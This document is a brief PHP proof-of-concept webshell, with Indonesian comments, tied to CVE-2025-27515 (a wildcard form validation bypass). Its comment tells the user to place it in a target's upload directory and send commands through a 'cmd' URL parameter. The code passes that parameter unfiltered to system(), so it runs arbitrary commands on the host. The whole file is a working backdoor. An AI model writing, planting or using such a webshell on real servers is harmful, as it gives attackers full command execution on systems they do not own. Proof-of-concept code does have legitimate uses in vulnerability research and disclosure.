<?php
// PoC webshell untuk CVE-2025-27515 (wildcard form validation bypass).
// Pemakaian: http://target/storage/uploads/shell.php?cmd=whoami
echo '<pre>';
echo 'CVE-2025-27515 PoC webshell aktif' . PHP_EOL;
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo 'Tambahkan ?cmd=<perintah> di URL, contoh: ?cmd=whoami';
}
echo '</pre>';
